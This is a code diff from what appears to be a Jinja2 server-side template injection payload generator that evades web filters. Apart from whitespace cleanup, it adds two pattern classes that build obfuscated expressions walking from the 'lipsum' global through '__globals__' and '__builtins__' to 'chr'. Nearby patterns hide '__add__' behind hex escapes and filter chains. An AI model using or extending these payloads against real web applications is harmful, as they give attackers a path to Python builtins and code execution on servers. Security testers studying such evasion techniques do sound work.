@@ -244,12 +244,12 @@ class PositiveIntPattern2(PositiveIntPattern):
         #     while num >= i:
         #         num -= i
         #         payload.append(s)
-        
+
         payload = get_int_from_sum(num)
 
         if payload is None:
             self.require(WillErrorPattern)
-            return 
+            return
 
         self.s = f"({'+'.join(payload)})"
 
@@ -275,7 +275,7 @@ class PositiveIntPattern3(PositiveIntPattern):
 
         if payload is None:
             self.require(WillErrorPattern)
-            return 
+            return
 
         payload_str = "".join([f".__add__({s})"for s in payload])
 
@@ -301,7 +301,7 @@ class PositiveIntPattern4(PositiveIntPattern):
 
         if payload is None:
             self.require(WillErrorPattern)
-            return 
+            return
 
         payload_str = "".join(
             [f"|attr(\"\\x5f\\x5fadd\\x5f\\x5f\")({s})"for s in payload])
@@ -339,10 +339,10 @@ class PositiveIntPattern6(PositiveIntPattern):
 
         if payload is None:
             self.require(WillErrorPattern)
-            return 
+            return
 
         payload = [number_dict[biggest_num], ] + payload
-        
+
         self.s = "(" + "-".join(payload) + ")"
 
         self.require(PlainPattern, self.s)
@@ -505,6 +505,33 @@ class PercentSignPattern3(PercentSignPattern):
     def _generate(self):
         return "({}|escape|urlencode|first)"
 
+class PercentSignPattern4(PercentSignPattern):
+    def __init__(self):
+        super().__init__()
+        self.pattern = "(lipsum[(lipsum|escape|batch(22)|list|first|last)*2+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2][(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))"
+        self.require(PlainPattern, self.pattern.replace("2", "").replace("37", ""))
+        self.require(IntPattern, 22)
+        self.require(IntPattern, 2)
+        self.require(IntPattern, 37)
+    def _generate(self):
+        return self.pattern\
+            .replace("22", self.use(IntPattern, 22))\
+            .replace("2", self.use(IntPattern, 2))\
+            .replace("37", self.use(IntPattern, 37))
+
+class PercentSignPattern5(PercentSignPattern):
+    def __init__(self):
+        super().__init__()
+        self.pattern = "(lipsum|attr((lipsum|escape|batch(22)|list|first|last)*2+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)|attr((lipsum|escape|batch(22)|list|first|last)*2+dict(getitem=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)((lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)|attr((lipsum|escape|batch(22)|list|first|last)*2+dict(getitem=x)|join+(lipsum|escape|batch(22)|list|first|last)*2)(dict(chr=x)|join)(37))"
+        self.require(PlainPattern, self.pattern.replace("2", "").replace("37", ""))
+        self.require(IntPattern, 22)
+        self.require(IntPattern, 2)
+        self.require(IntPattern, 37)
+    def _generate(self):
+        return self.pattern\
+            .replace("22", self.use(IntPattern, 22))\
+            .replace("2", self.use(IntPattern, 2))\
+            .replace("37", self.use(IntPattern, 37))
 
 class LowerCPattern(BasePattern):
     pass
@@ -571,12 +598,12 @@ class PercentSignLowerCPattern2(PercentSignLowerCPattern):
         super().__init__()
         self.pattern = "cycler|pprint|list|pprint|urlencode|batch(%s)|first|join|batch(%s)|list|last|reverse|join|lower"
         self.require(
-            PlainPattern, 
+            PlainPattern,
             self.pattern.replace("{}", "")
         )
         self.require(IntPattern, 10)
         self.require(IntPattern, 8)
-    
+
     def _generate(self):
         return self.pattern % (
             self.use(IntPattern, 10),
